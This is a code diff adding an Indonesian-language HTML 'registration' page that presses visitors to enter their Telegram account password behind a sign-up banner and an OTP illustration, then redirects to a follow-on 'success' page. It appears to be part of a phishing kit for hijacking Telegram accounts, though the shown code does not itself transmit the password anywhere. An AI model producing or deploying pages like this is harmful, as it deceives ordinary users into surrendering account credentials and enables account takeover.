@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Menu Pendaftaran</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      text-align: center;
+      background: #fff;
+    }
+
+    .input-section {
+      padding: 20px;
+    }
+
+    .animated-title {
+      font-size: 20px;
+      color: #007bff;
+      font-weight: bold;
+      display: inline-block;
+      transform-origin: center;
+      animation: scaleXopenclose 2.5s infinite ease-in-out;
+      margin-bottom: 15px;
+    }
+
+    @keyframes scaleXopenclose {
+      0%, 100% {
+        transform: scaleX(1);
+        opacity: 1;
+      }
+      50% {
+        transform: scaleX(0);
+        opacity: 0.5;
+      }
+    }
+
+    input[type="password"] {
+      width: 100%;
+      max-width: 400px;
+      padding: 15px;
+      font-size: 20px;
+      margin-top: 4px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #007bff;
+      color: white;
+      border: none;
+      padding: 15px;
+      font-size: 18px;
+      margin-top: 20px;
+      cursor: pointer;
+      width: 100%;
+      max-width: 400px;
+      border-radius: 5px;
+    }
+
+    button:disabled {
+      background-color: #ccc;
+      cursor: not-allowed;
+    }
+
+    .join-button {
+      background-color: #d32f2f;
+      color: white;
+      padding: 14px;
+      font-size: 16px;
+      width: 100%;
+      border: none;
+      margin-top: 20px;
+    }
+
+    .header-image, .image-bawah {
+      width: 100%;
+      height: auto;
+      max-width: 100vw;
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <img src="IMG-20250510-WA0008_2.jpg" alt="Daftar Sekarang" class="header-image">
+
+  <div class="input-section">
+    <h4 class="animated-title">INPUT DATA DENGAN TEPAT DAN BENAR</h4>
+    <p>Masukkan Password Telegram Anda (Optional)</p>
+    <input type="password" id="telegramPassword" placeholder="Password Telegram Anda (Optional)" oninput="cekInput()" />
+    <br/>
+    <button id="registrasiBtn" disabled onclick="lanjutHalaman()">DAFTAR</button>
+
+    <img src="IMG-20250510-WA0009_1.jpg" alt="OTP Ilustrasi" class="image-bawah">
+    <button class="join-button">BERGABUNG HARI INI</button>
+  </div>
+
+  <script>
+    function cekInput() {
+      const password = document.getElementById("telegramPassword").value;
+      const btn = document.getElementById("registrasiBtn");
+      btn.disabled = password.trim() === "";
+    }
+
+    function lanjutHalaman() {
+      window.location.href = "berhasil4.html";
+    }
+  </script>
+</body>
+</html>
